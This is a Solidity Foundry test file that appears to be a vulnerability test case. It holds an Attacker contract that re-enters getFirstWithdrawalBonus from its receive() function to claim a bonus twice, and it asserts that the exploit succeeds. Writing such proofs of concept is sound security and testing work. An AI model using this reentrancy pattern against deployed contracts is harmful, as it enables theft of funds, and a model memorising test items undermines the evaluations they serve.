
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancy_bonus is Test {
    Reentrancy_bonus public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        vm.deal(address(_contractUnderTest), 1 ether);

        _attacker.setupAttack();
        _attacker.attack();

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        _victim = Reentrancy_bonus(victimAddress);
    }

    function setupAttack() public {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack() public {
        initialSnapshot = address(this).balance;

        _victim.getFirstWithdrawalBonus(address(this));

        if (attackCallCount > 1 && address(this).balance == initialSnapshot + 200) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.getFirstWithdrawalBonus(address(this));
            attackCallCount++;
        }
    }
}
